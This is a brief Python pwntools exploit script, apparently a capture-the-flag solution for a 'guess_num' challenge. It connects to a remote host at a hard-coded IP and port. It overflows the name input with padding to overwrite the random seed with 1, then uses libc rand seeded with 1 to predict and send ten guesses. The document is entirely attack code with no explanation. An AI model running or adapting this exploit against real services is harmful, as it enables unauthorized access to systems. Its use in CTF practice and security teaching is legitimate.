#!/usr/bin/env python
# coding: utf-8

from pwn import *
from ctypes import *

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
#p=process("./guess_num")
p = remote("111.198.29.45", 32216, timeout=3)
pay = "A"*0x20 + p64(1) 
p.sendlineafter("name:",pay)

libc.srand(1)

for i in range(10): p.sendlineafter("number:",str(libc.rand()%6 + 1))

print p.recv() 
print p.recv() 

